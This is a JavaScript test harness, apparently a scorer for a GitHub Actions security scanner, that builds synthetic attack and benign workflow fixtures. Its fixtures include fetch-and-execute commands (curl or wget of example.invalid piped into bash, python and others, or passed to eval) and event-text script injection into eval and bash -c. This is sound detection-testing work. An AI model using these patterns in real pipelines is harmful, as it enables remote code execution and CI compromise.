'use strict';
/* Deterministic, inert security evaluation: NEVER execute these workflows. */
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
const {analyze}=require('./ultra_sentinel_core.cjs');
const {candidate,judge}=require('./ultra_sentinel_orchestrator.cjs');
const {evaluateProtectedChanges}=require('./ultra_sentinel_policy.cjs');
const {extremeFixtures}=require('./ultra_sentinel_gauntlet_extreme.cjs');
const SHA='a'.repeat(40),SECOND_SHA='b'.repeat(40);
const PATH='.github/workflows/gauntlet.yml';
const ROOT='app/src/main/java/com/cardenaspiero255/gamehubultra/';
const EXPR=t=>'$'+'{{ '+t+' }}';
const cases=[],identities=new Set();
const add=(id,family,kind,source,rule=null,extra={})=>{
 if(identities.has(id))throw Error('duplicate '+id);identities.add(id);
 cases.push({id,family,kind,source,rule,...extra});
};
function wf({run='echo OK',trigger='issue_comment',permission='read-all',
 env=[],jobEnv=[],stepEnv=[],action=null,ref=null,runner='ubuntu-latest',
 jobIf=null,stepIf=null,continueOnError=null,shell=null}={}){
 const lines=['on: '+trigger,'permissions: '+permission,
 ...(env.length?['env:',...env.map(v=>'  '+v)]:[]),
 'jobs:','  audit:','    runs-on: '+runner,
 ...(jobIf==null?[]:['    if: '+jobIf]),
 ...(jobEnv.length?['    env:',...jobEnv.map(v=>'      '+v)]:[]),
 '    steps:',...(stepEnv.length?['      - env:',...stepEnv.map(v=>'          '+v),
   ...(action?[]:['        run: |'])]:[]),
 ...(stepEnv.length?[]:[action?'      - uses: '+action:'      - run: |']),
 ...(stepIf==null?[]:['        if: '+stepIf]),
 ...(continueOnError==null?[]:['        continue-on-error: '+continueOnError]),
 ...(shell==null?[]:['        shell: '+shell])
 ];
 if(action){if(ref!=null)lines.push('        with:','          ref: '+ref);}
 else lines.push(...run.split('\n').map(v=>'          '+v));
 return lines.join('\n')+'\n';
}
const mutation=[
 ['plain',s=>s],
 ['bom',s=>'\uFEFF'+s],
 ['crlf',s=>s.replace(/\n/g,'\r\n')],
 ['quoted-key',s=>s.replace(/^on:/,"'on':")],
 ['unicode-key',s=>s.replace(/^on:/,'"\\u006fn":')],
 ['comments',s=>'# Test fixture only, not executable\n'+s+'# End fixture\n'],
 ['rename-job',s=>s.replace('  audit:','  adversarial_job_7:')],
 ['quoted-jobs',s=>s.replace(/^jobs:/m,'"jobs":')]
];
const addAttack=(id,group,src,rule=null,other={})=>add(id,group,'attack',src,rule,other);
const addSafe=(id,group,src)=>add(id,group,'safe',src);
const addUnknown=(id,group,src)=>add(id,group,'uncertain',src);
// Attack family 1/2: executable downloads via pipelines, redirects and arguments.
for(const [down,cmd] of [['curl','curl -fsSL https://example.invalid/p'],
 ['wget','wget -qO- https://example.invalid/p']]){
 for(const lang of ['bash','sh','python','python3','node','ruby','perl','php']){
  addAttack(down+'-pipe-'+lang,'remote-pipeline',wf({run:cmd+' | '+lang}),
   'REMOTE_SHELL_PIPELINE',{heuristic:true});
  addAttack(down+'-process-'+lang,'remote-process',wf({run:lang+' <('+cmd+')'}),
   'REMOTE_SHELL_SUBSTITUTION',{heuristic:true});
  addAttack(down+'-stdin-'+lang,'remote-stdin',wf({run:lang+' < <('+cmd+')'}),
   'REMOTE_SHELL_SUBSTITUTION',{heuristic:true});
  addAttack(down+'-here-'+lang,'remote-stdin',wf({run:lang+' <<< "$('+cmd+')"'}),
   'REMOTE_SHELL_SUBSTITUTION',{heuristic:true});
 }
 for(const lang of ['bash','python','node','ruby','perl','php']){
  const opt=['node','ruby','perl'].includes(lang)?'-e':lang==='php'?'-r':'-c';
  addAttack(down+'-arg-'+lang,'remote-argument',
   wf({run:lang+' '+opt+' "$('+cmd+')"'}),'REMOTE_SHELL_SUBSTITUTION',{heuristic:true});
 }
 addAttack(down+'-eval','remote-argument',wf({run:'eval "$('+cmd+')"'}),
  'REMOTE_SHELL_SUBSTITUTION',{heuristic:true});
 addAttack(down+'-output','remote-redirection',wf({run:cmd+' -o >(bash)'}),
  'REMOTE_SHELL_SUBSTITUTION',{heuristic:true});
 addSafe(down+'-download-only','benign-download',wf({run:cmd+' -o /tmp/data.txt'}));
}
// Attack family 3: event text injection, including direct and through env aliases.
for(const [name,reference,trigger] of [
 ['issue',EXPR('github.event.issue.title'),'issue_comment'],
 ['comment',EXPR('github.event.comment.body'),'issue_comment'],
 ['pr-title',EXPR('github.event.pull_request.title'),'pull_request_target'],
 ['head-ref',EXPR('github.head_ref'),'pull_request_target'],
 ['review',EXPR('github.event.review.body'),'pull_request_review'],
 ['dispatch',EXPR('github.event.client_payload.command'),'repository_dispatch']
]){
 for(const [mode,command] of [
  ['echo','echo "'+reference+'"'],
  ['eval','eval "'+reference+'"'],
  ['shell','bash -c "'+reference+'"']
 ])addAttack('event-'+name+'-'+mode,'untrusted-expression',wf({run:command,trigger}),
   'PRIVILEGED_EVENT_SCRIPT_INJECTION');
}
for(let count=1;count<=10;count++){
 const env=['A: "'+EXPR('github.event.issue.title')+'"'];
 for(let i=1;i<=count;i++)env.push('V'+i+': "$'+(i===1?'A':'V'+(i-1))+'"');
 addAttack('alias-'+count,'env-transitive',wf({env,run:'eval "$V'+count+'"'}),
  'PRIVILEGED_EVENT_SCRIPT_INJECTION');
}
for(const [name,expr] of [
 ['numeric','$'+'((A))'],['nested','$'+'(( (A) + 1 ))'],
 ['bracket','$'+'[A+1]'],['indirect','$'+'{!A}'],
 ['default','$'+'{A:-default}'],['unknown','$'+'((A + UNKNOWN))']
]){
 addAttack('arithmetic-'+name,'arithmetic-and-indirection',
  wf({env:['A: "'+EXPR('github.event.issue.title')+'"','B: "'+expr+'"'],run:'eval "$B"'}));
}
// Codex P1: bare Bash arithmetic commands and let recursively evaluate
// attacker-controlled variable subscripts even without a $ prefix.
for(const run of ['(( A ))','(( A + 1 ))','let A+=1','let "A + 1"']){
 addAttack('arithmetic-command-'+run.replace(/[^a-z0-9]/ig,'-'),
  'arithmetic-command',
  wf({env:['A: "'+EXPR('github.event.issue.title')+'"'],run}));
}
// Attack family 4: supply chain, privileged refs and permissions.
for(const [name,version] of [
 ['v4','v4'],['tag','stable'],['semver','1.2.3'],
 ['branch','develop'],['short','ab3d45'],['expression',EXPR('inputs.version')]
]){
 for(const vendor of ['actions/checkout','actions/setup-node','vendor/analyze']){
  addAttack('unpinned-'+vendor.replace('/','-')+'-'+name,'unpinned-supply-chain',
   wf({action:vendor+'@'+version}),'UNPINNED_ACTION');
 }
}
for(const [name,ref] of [
 ['pr-head',EXPR('github.event.pull_request.head.sha')],
 ['headref',EXPR('github.head_ref')],
 ['pr-merge','refs/pull/12/merge'],
 ['pr-raw','refs/pull/12/head'],
 ['branch','refs/heads/untrusted'],
 ['tag','refs/tags/floating'],
 ['dynamic',EXPR('inputs.ref')]
]){
 addAttack('checkout-'+name,'privileged-checkout',
  wf({trigger:'pull_request_target',action:'actions/checkout@'+SHA,ref}));
}
for(const capability of ['contents','actions','id-token','checks','issues',
 'pull-requests','packages','deployments']){
 addAttack('token-'+capability,'write-token',
  wf({permission:'{'+capability+': write}'}),'PRIVILEGED_WRITE_TOKEN');
}
// Attack family 5: fail-closed control gates, execution environments.
for(const [name,settings] of [
 ['never-job',{jobIf:'false'}],
 ['never-step',{stepIf:'false'}],
 ['ignore-failure',{continueOnError:'true'}],
 ['impossible-event',{jobIf:EXPR("github.event_name == 'push'")}],
 ['host',{runner:'self-hosted'}],
 ['untrusted-runner',{runner:EXPR('inputs.runner')}],
 ['custom-shell',{shell:'custom-shell'}],
 ['unknown-shell',{shell:'fish'}]
]){
 addUnknown('gate-'+name,'gate-and-runner',wf(settings));
}
const legitimate=wf();
for(const [name,changed] of [
 ['duplicated-trigger',legitimate+'on: push\n'],
 ['duplicated-jobs',legitimate+'jobs: {}\n'],
 ['invalid-yaml',legitimate.replace('on: issue_comment','on: [issue_comment')],
 ['custom-tag',legitimate.replace('on: issue_comment','on: !custom issue_comment')],
 ['missing-trigger',legitimate.replace('on: issue_comment\n','')],
 ['missing-jobs',legitimate.replace('jobs:','nonjobs:')],
 ['unknown-alias',legitimate.replace('on: issue_comment','on: *unknown')],
 ['oversize',legitimate+'#'+'x'.repeat(160001)]
]){
 addUnknown('yaml-'+name,'yaml-and-parser-limits',changed);
}
// Benign adversarial lookalikes: reward precision, not indiscriminate alarms.
for(const [name,run] of [
 ['echo','echo success'],['quote','echo "curl fake | bash"'],
 ['local-script','python file.py'],['local-input','python < file.py'],
 ['local-here','bash <<< "echo good"'],['local-pipe','echo hi | grep hi'],
 ['download-data','curl https://example.invalid/p -o file.txt'],
 ['hash','echo "'+EXPR('github.sha')+'"'],
 ['number','echo "'+EXPR('github.event.issue.number')+'"'],
 ['arithmetic','echo "$((2+3))"'],['local-variables','echo "$A"']
]){
 addSafe('benign-'+name,'benign-shell',
  wf({run,env:name==='local-variables'?['A: hello']:[]}));
}
for(const [name,line,rule,malicious] of [
 ['gc','System.gc()','FORCED_GC',true],
 ['sleep','Thread.sleep(150)','BLOCKING_ANDROID_CALL',true],
 ['global','GlobalScope.launch { go() }','UNSCOPED_COROUTINE',true],
 ['loop','while (true) { work() }','NON_CANCELLABLE_LOOP',true],
 ['comment','// System.gc()','FORCED_GC',false],
 ['string','val doc = "System.gc()"','FORCED_GC',false],
 ['delay','delay(150)','BLOCKING_ANDROID_CALL',false],
 ['scope','lifecycleScope.launch { go() }','UNSCOPED_COROUTINE',false],
 ['time','System.nanoTime()','FORCED_GC',false]
])add('android-'+name,'android-code',malicious?'core-attack':'core-safe',
  line,rule,{file:ROOT+'Engine.kt'});
// Exploit families outside YAML: patch confusion, stale SHA, protected files.
const FILE=ROOT+'Engine.kt',SRC='fun render() {\n  System.gc()\n  println("ok")\n}\n';
const F={rule:'FORCED_GC',path:FILE,line:2,severity:'MEDIUM'};
const CHECKS={'sentinel-core-tests':'success','android-build':'success',
 'unit-test-coverage':'success','architecture-boundary':'success'};
const candidatePatch=candidate({filename:FILE,content:SRC,sha:SHA,findings:[F]});
if(candidatePatch.status!=='DRAFT_PATCH')throw Error('Invalid control candidate');
for(const [name,change] of [
 ['wrong-sha',{sha:SECOND_SHA}],
 ['changed-line',{linesChanged:2}],
 ['different-rule',{rule:'UNBOUNDED_RECURSION'}],
 ['truncated-patch',{patch:candidatePatch.patch.slice(0,-1)}],
 ['extra-command',{patch:candidatePatch.patch+'+echo unsafe\n'}],
 ['unauthorized-path',{filename:'.github/workflows/build.yml'}]
])add('patch-'+name,'patch-integrity','judge-attack',null,null,
 {proposal:{...candidatePatch,...change}});
add('patch-legitimate','patch-integrity','judge-safe',null,null,{proposal:candidatePatch});
for(const [name,entry,kind] of [
 ['modified',{filename:'.github/workflows/android.yml',status:'modified'},'policy-attack'],
 ['deleted',{filename:'.github/workflows/coverage.yml',status:'removed'},'policy-attack'],
 ['added',{filename:'.github/scripts/backdoor.cjs',status:'added'},'policy-attack'],
 ['rename',{filename:'docs/new.md',previous_filename:'.github/workflows/android.yml',status:'renamed'},'policy-attack'],
 ['docs',{filename:'docs/README.md',status:'modified'},'policy-safe']
])add('policy-'+name,'protected-files',kind,null,null,{entry});
// These are deliberately challenging out-of-distribution cases. Any escape
// must be visible in the score; unknown is not secretly counted as detected.
const hard=extremeFixtures();
for(const [name,family,run] of hard.unsafe)
 addAttack('extreme-'+name,family,wf({run}),null,{tier:'extreme'});
for(const [name,family,run] of hard.uncertain){
 if(['heredoc-shell','computed-github-script'].includes(name))
  addSafe('extreme-'+name,'benign-complex-shell',wf({run}));
 else if(['multiline-pipeline','unverified-action-expression'].includes(name))
  addAttack('extreme-'+name,family,wf({run}));
 else addUnknown('extreme-'+name,family,wf({run}));
}
for(const [name,family,run] of hard.benign)
 addSafe('extreme-'+name,family,wf({run}));
function variants(){
 const result=[];
 for(const item of cases){
  for(const [name,mutate] of ['attack','safe','uncertain'].includes(item.kind)?
    mutation:[['plain',s=>s]]){
   result.push({...item,id:item.id+'/'+name,variant:name,source:
    typeof item.source==='string'&&['attack','safe','uncertain'].includes(item.kind)?
     mutate(item.source):item.source});
  }
 }
 return result;
}
function classify(x){
 if(x.kind==='core-attack'||x.kind==='core-safe'){
  const f={filename:x.file,changes:1,patch:'@@ -1,0 +1,1 @@\n+'+x.source+'\n'};
  const got=analyze([f]);return {outcome:got.findings.some(a=>a.rule===x.rule)?
   'DETECTED':'CLEAN',scanner:'core'};
 }
 if(x.kind==='judge-attack'||x.kind==='judge-safe'){
  const got=judge(x.proposal,{sha:SHA,checks:CHECKS,source:SRC,findings:[F]});
  return {outcome:got.status,scanner:'judge'};
 }
 if(x.kind==='policy-attack'||x.kind==='policy-safe'){
  const got=evaluateProtectedChanges([x.entry],{expectedCount:1});
  return {outcome:got.status,scanner:'policy'};
 }
 const ast=inspectWorkflow(x.source,{path:PATH,
  trustedRepository:'cardenaspiero255-lang/gamehub-ultra'});
 const heuristic=reviewWorkflows({sha:SHA,expected:[PATH],sources:{[PATH]:x.source}});
 const found=x.rule?ast.findings.some(f=>f.rule===x.rule):
  ast.findings.some(f=>f.severity==='BLOCKER'||f.severity==='HIGH');
 return {outcome:found?'DETECTED':ast.status==='INCOMPLETE'?'INCOMPLETE':
  ast.findings.length?'OTHER_FINDING':'CLEAN',
  scanner:'yaml-ast',astStatus:ast.status,
  heuristic:heuristic.status,heuristicDetected:heuristic.findings.length>0,
  findings:ast.findings.map(f=>f.rule)};
}
function evaluate(){
 const summary={total:0,threats:0,explicit:0,incomplete:0,otherFinding:0,
  missed:0,benign:0,benignClean:0,benignFlagged:0,
  unknown:0,unknownBlocked:0,unknownClean:0,crashes:0,
  heuristicCovered:0,heuristicMissed:0};
 const byFamily={},issues=[];
 for(const x of variants()){
  let got;
  try{got=classify(x)}catch(e){got={outcome:'CRASH',error:String(e).slice(0,160)};summary.crashes++}
  summary.total++;
  const group=byFamily[x.family]||{tested:0,explicit:0,incomplete:0,missed:0,falsePositive:0};
  byFamily[x.family]=group;group.tested++;
  if(['attack','core-attack','judge-attack','policy-attack'].includes(x.kind)){
   summary.threats++;
   const explicit=x.kind==='judge-attack'?got.outcome==='REJECT':
    x.kind==='policy-attack'?['BLOCKED','REVIEW_REQUIRED'].includes(got.outcome):
    got.outcome==='DETECTED';
   if(explicit){summary.explicit++;group.explicit++;}
   else if(got.outcome==='INCOMPLETE'){summary.incomplete++;group.incomplete++;}
   else if(got.outcome==='OTHER_FINDING'){summary.otherFinding++;group.incomplete++;}
   else{summary.missed++;group.missed++;}
   if(x.heuristic){if(got.heuristicDetected)summary.heuristicCovered++;
    else summary.heuristicMissed++;}
  }else if(['safe','core-safe','judge-safe','policy-safe'].includes(x.kind)){
   summary.benign++;
   const ok=x.kind==='judge-safe'?got.outcome==='ELIGIBLE_FOR_HUMAN_REVIEW':
    x.kind==='policy-safe'?got.outcome==='OK':got.outcome==='CLEAN';
   if(ok)summary.benignClean++;
   else{summary.benignFlagged++;group.falsePositive++;}
  }else{
   summary.unknown++;
   if(['INCOMPLETE','DETECTED','OTHER_FINDING'].includes(got.outcome))summary.unknownBlocked++;
   else summary.unknownClean++;
  }
  if((x.kind==='attack'&&got.outcome!=='DETECTED')||
    (x.kind==='safe'&&got.outcome!=='CLEAN')||
    (x.kind==='uncertain'&&got.outcome==='CLEAN')||
    got.outcome==='CRASH'){
   issues.push({id:x.id,family:x.family,actual:got.outcome,
    expected:x.kind,findings:got.findings||[],error:got.error||null});
  }
 }
 const fraction=(a,b)=>b?a/b:null;
 return {schema:'ultra-sentinel-adversarial-gauntlet/v1',seed:'fixed-2026-10',
  summary,metrics:{explicitRecall:fraction(summary.explicit,summary.threats),
   failClosedRecall:fraction(summary.explicit+summary.incomplete+summary.otherFinding,summary.threats),
   benignSpecificity:fraction(summary.benignClean,summary.benign),
   heuristicCorrelatedHitRate:fraction(summary.heuristicCovered,summary.heuristicCovered+summary.heuristicMissed)},
  byFamily,issues:issues.sort((a,b)=>{
   const priority=x=>x.actual==='CLEAN'?0:x.actual==='CRASH'?1:
    x.actual==='INCOMPLETE'?2:3;
   return priority(a)-priority(b)||a.id.localeCompare(b.id);
  }),limitation:'Inert synthetic data only; INCOMPLETE is not a detection. Heuristic and AST share a remote-execution classifier and their results are correlated, not independent; neither represents real-world accuracy or proof of security.'};
}
function markdown(report){
 const s=report.summary,p=x=>x==null?'N/A':(100*x).toFixed(1)+'%';
 return ['### Ultra Sentinel adversarial stress test',
  '| Measure | Value |','|---|---:|',
  '| Total mutated scenarios | '+s.total+' |',
  '| Malicious scenarios | '+s.threats+' |',
  '| Explicit detection | '+s.explicit+' ('+p(report.metrics.explicitRecall)+') |',
  '| Blocked by uncertainty | '+(s.incomplete+s.otherFinding)+' |',
  '| Silent misses | '+s.missed+' |',
  '| Benign false alarms | '+s.benignFlagged+' |',
  '| Unknown mistakenly clean | '+s.unknownClean+' |',
  '| Runtime errors | '+s.crashes+' |',
  '',
  'Incomplete or other findings are never counted as explicit detection.',
  ...Object.entries(report.byFamily).map(([k,v])=>'- '+k+': '+v.tested+
   ' test cases; '+v.explicit+' explicit, '+v.incomplete+' uncertain, '+
   v.missed+' missed, '+v.falsePositive+' false positives'),
  '',
  ...report.issues.slice(0,30).map(x=>'- '+x.id+': '+x.actual)
 ].join('\n')+'\n';
}
if(require.main===module){
 const report=evaluate();
 if(process.argv.includes('--compact'))console.log(JSON.stringify({
  schema:report.schema,summary:report.summary,metrics:report.metrics,
  byFamily:report.byFamily,firstUnresolved:report.issues.slice(0,35),
  limitation:report.limitation
 },null,2));
 else console.log(JSON.stringify(report,null,2));
 if(process.env.GITHUB_STEP_SUMMARY)require('node:fs').appendFileSync(
  process.env.GITHUB_STEP_SUMMARY,markdown(report));
 if(process.argv.includes('--strict')&&
  (report.summary.missed||report.summary.benignFlagged||report.summary.unknownClean||report.summary.crashes))
  process.exitCode=1;
}
module.exports={cases,variants,evaluate,markdown,classify};
